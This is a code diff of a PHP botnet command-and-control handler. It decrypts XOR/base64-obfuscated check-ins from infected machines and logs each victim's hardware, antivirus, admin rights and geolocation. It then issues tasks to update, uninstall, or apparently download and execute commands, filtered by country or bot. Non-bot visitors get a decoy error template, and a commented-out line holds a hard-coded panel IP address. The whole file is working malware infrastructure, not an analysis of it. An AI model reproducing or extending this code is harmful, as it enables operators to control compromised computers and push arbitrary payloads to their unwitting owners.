@@ -2,10 +2,12 @@
 
 use GeoIp2\Database\Reader;
 
-class BotHandler{
+class BotHandler
+{
 
 
-    public function xor_this($data) {
+    public function xor_this($data)
+    {
 
         $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
         $statementConfig->execute(array("1"));
@@ -21,26 +23,53 @@ class BotHandler{
     }
 
 
-
-    public function request(){
-        $GLOBALS["template"][0] ="FakeErrors";
-        $GLOBALS["template"][1] ="cloudflare";
+    public function request()
+    {
+        $GLOBALS["template"][0] = "FakeErrors";
+        $GLOBALS["template"][1] = "cloudflare";
         $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
         $statementConfig->execute(array("1"));
         $config = $statementConfig->fetch();
 
-        if($_SERVER['HTTP_USER_AGENT'] != $config["useragent"] AND empty($_POST)){
-            //echo $this->xor_this("http://35.204.135.202/request");
-            // echo $this->xor_this("#7%;y~dpdeqam`xvyscd14:6487;+!");
 
-        }else{
-            $gi = geoip_open(__DIR__."/../../Geo/GeoIP.dat", "");
-            $reader = new Reader(__DIR__.'/../../Geo/GeoLite2-City.mmdb');
+        if (!empty($_POST["botversion"])) {
+            //Old version
+            die();
+        }
+
+        //  var_dump($_POST);
+        if(!empty($_POST["taskid"])){
+            $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks_completed SET status = ? WHERE taskid = ? AND bothwid LIKE ?"); // AND taskid = ?
+            $statement->execute(array($_POST["taskstatus"], $_POST["taskid"], $_POST["hwid"]));
+            die("nice");
+        }
+
+
+        //echo $_POST["taskid"];
+
+        //Decrypt Main Requests
+        if (!empty($_POST["request"])) {
+
+            $signal = base64_decode($this->xor_this(base64_decode($_POST["request"])));
+
+            parse_str($signal, $postbot);
+
+            $botfound = false;
+            $bot = "";
 
 
 
 
-            if(!empty($_SERVER['REMOTE_ADDR'])){
+
+
+
+
+            $gi = geoip_open(__DIR__ . "/../../Geo/GeoIP.dat", "");
+            $reader = new Reader(__DIR__ . '/../../Geo/GeoLite2-City.mmdb');
+
+
+
+            if (!empty($_SERVER['REMOTE_ADDR'])) {
                 $ip = $_SERVER['REMOTE_ADDR'];
                 $record = $reader->city($ip);
                 $country = geoip_country_code_by_addr($gi, $ip);
@@ -48,7 +77,7 @@ class BotHandler{
                 $countryCity = $record->city->name;
                 $countryLatitude = $record->location->latitude;
                 $countryLongitude = $record->location->longitude;
-            }else{
+            } else {
                 $country = "unknow";
                 $countryLatitude = "";
                 $countryLongitude = "";
@@ -57,58 +86,50 @@ class BotHandler{
 
 
 
+
+
+
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
-            $statement->execute(array($_POST["hwid"]));
-            $botfound = false;
-            $bot = "";
-            while($row = $statement->fetch()) {
+            $statement->execute(array($postbot["hwid"]));
+            while ($row = $statement->fetch()) {
                 $botfound = true;
                 $bot = $row;
             }
 
+            if ($botfound) {
 
-            if($botfound){
 
 
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE bots SET lastresponse = CURRENT_TIMESTAMP() WHERE hwid = ?");
-                $statement->execute(array($_POST["hwid"]));
-                //
+                $statement->execute(array($postbot["hwid"]));
 
-                if(isset($_POST["ps"]) && isset($_POST["id"])){
-                    //Executed Task
-                    $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks_completed SET status = ? WHERE taskid = ? AND bothwid = ?"); // AND taskid = ?
-                    $statement->execute(array($_POST["ps"], $_POST["id"], $_POST["hwid"]));
-                }
 
                 $cmds = $GLOBALS["pdo"]->query("SELECT * FROM tasks ORDER BY id");
-                while ($com = $cmds->fetch(PDO::FETCH_ASSOC))
-                {
-                    if ($com['status'] == "1")
-                    {
+                while ($com = $cmds->fetch(PDO::FETCH_ASSOC)) {
+                    if ($com['status'] == "1") {
                         //$executions = $GLOBALS["pdo"]->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
                         $ae = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
-                        $ae->execute(array(":i" => $com['id'], ":h" => $_POST["hwid"]));
-                        if ($ae->fetchColumn(0) == 0)
-                        {
+                        $ae->execute(array(":i" => $com['id'], ":h" => $postbot["hwid"]));
+                        if ($ae->fetchColumn(0) == 0) {
                             //TODO FILTER CHECKING
                             //CHECK if Filter is Empty
-                            if(!empty($com["filter"])){
+                            if (!empty($com["filter"])) {
                                 //Check if Filter is none
-                                if($com["filter"] != "[]"){
+                                if ($com["filter"] != "[]") {
                                     //Filter to array
-                                    $filter = json_decode($com["filter"],true);
-                                    if(is_array($filter)){
+                                    $filter = json_decode($com["filter"], true);
+                                    if (is_array($filter)) {
                                         // Search Country in Filter if not found die
-                                        if(!empty($filter["country-filter"])){
+                                        if (!empty($filter["country-filter"])) {
                                             if (strpos($filter["country-filter"], $country) == false) {
                                                 continue;
                                             }
                                         }
 
                                         //Check if Bot Only Ececution
-                                        if(!empty($filter["onlybot"])) {
-                                            if($filter["onlybot"] != $bot["id"]){
-                                               continue;
+                                        if (!empty($filter["onlybot"])) {
+                                            if ($filter["onlybot"] != $bot["id"]) {
+                                                continue;
                                             }
                                         }
 
@@ -116,17 +137,17 @@ class BotHandler{
                                 }
                             }
 
-                            if($com["task"] == "uninstall"){
-                                echo $com["task"];
-                            }elseif($com["task"] == "update"){
-                                echo "update;".$com["id"].";".$com["command"];
-                            } else{
-                                echo "newtask;".$com["id"].";".$com["command"];
+                            if ($com["task"] == "uninstall") {
+                                echo $com["id"] . ";uninstall;uninstall";
+                            } elseif ($com["task"] == "update") {
+                                echo $com["id"] . ";update;". $com["command"];
+                            } else {
+                                echo $com["id"] . ";dande;" . $com["command"];
                             }
                             //send taskID
 
                             $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks_completed (bothwid, taskid, status) VALUES (?, ?, ?)");
-                            $statement->execute(array($_POST["hwid"], $com["id"], "send"));
+                            $statement->execute(array($postbot["hwid"], $com["id"], "send"));
                             //insert Send
                             // Get Executed or Failed
                             die();
@@ -135,40 +156,51 @@ class BotHandler{
                     }
                 }
 
-            }else{
+            } else {
                 $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                if(!empty($_POST["av"])){
-                    $avcheck = $_POST["av"];
-                }else{
+                if (!empty($postbot["antivirus"])) {
+                    $avcheck = $postbot["antivirus"];
+                } else {
                     $avcheck = "none";
                 }
 
+
                 $statement->execute(array(
                     $avcheck,
-                    $_POST["hwid"],
-                    $this->xor_this($_POST["username"]),
+                    $postbot["hwid"],
+                    $postbot["computername"],
                     $country,
-                    $this->xor_this($_POST["nf2"]),
-                    $this->xor_this($_POST["nf3"]),
-                    $this->xor_this($_POST["nf35"]),
-                    $this->xor_this($_POST["nf4"]),
+                    $postbot["netFramework2"],
+                    $postbot["netFramework3"],
+                    $postbot["netFramework35"],
+                    $postbot["netFramework4"],
                     $countryLatitude,
                     $countryLongitude,
                     $countryName,
-                    $_POST["ram"],
-                    $_POST["gpu"],
-                    $_POST["cpu"],
-                    $_POST["aornot"],
-                    $_POST["arch"],
+                    $postbot["installedRam"],
+                    $postbot["gpuName"],
+                    $postbot["cpuName"],
+                    $postbot["aornot"],
+                    $postbot["prcessorArchitecture"],
                     $ip,
-                    $_POST["os"],
-                    $this->xor_this($_POST["botversion"])
+                    $postbot["operingsystem"],
+                    $postbot["botversion"]
                 ));
             }
             echo "waiting";
             die();
         }
 
+
+        die();
+
+
     }
+
+
+
+
+
+
 
 }
